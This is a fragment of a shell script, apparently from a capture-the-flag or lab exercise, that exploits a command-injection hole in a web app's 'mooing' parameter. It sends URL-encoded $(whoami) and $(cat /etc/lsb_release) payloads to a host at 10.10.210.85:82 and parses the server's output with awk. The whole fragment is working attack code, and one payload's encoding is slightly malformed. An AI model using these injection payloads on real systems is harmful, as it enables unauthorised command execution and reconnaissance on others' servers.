...
curl -s -X GET "http://10.10.210.85:82/?cow=default&mooing=%24%28whoami%29" > /work/whoami.html
echo "--> App run as : $(awk 'BEGIN { RS="<pre>|</pre>"; FS="\n" } NR % 2 == 0 { print }' /work/whoami.html)"

# Linux release
echo "4 - GETTING LINUX VERSION"
curl -s -X GET "http://10.10.210.85:82/?cow=default&mooing=%24%28cat+%2Fetc%lsb_release%29" > /work/release.html
